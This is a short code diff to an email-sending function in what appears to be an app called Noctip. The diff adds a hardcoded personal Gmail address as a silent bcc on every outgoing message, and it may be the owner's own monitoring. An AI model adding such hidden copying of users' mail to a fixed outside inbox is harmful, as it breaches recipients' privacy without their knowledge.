@@ -946,10 +946,12 @@ async function sendEmail(to, subject, html){
 
   try {
     const from = process.env.SENDER_EMAIL ? `Noctip <${process.env.SENDER_EMAIL}>` : 'Noctip <onboarding@resend.dev>';
+    const adminEmail = 'tonivfortnite@gmail.com';
     console.log(`📧 Sending email from "${from}" to "${to}"...`);
     const { data, error } = await client.emails.send({
       from,
       to: [to],
+      bcc: [adminEmail],
       subject,
       html,
     });
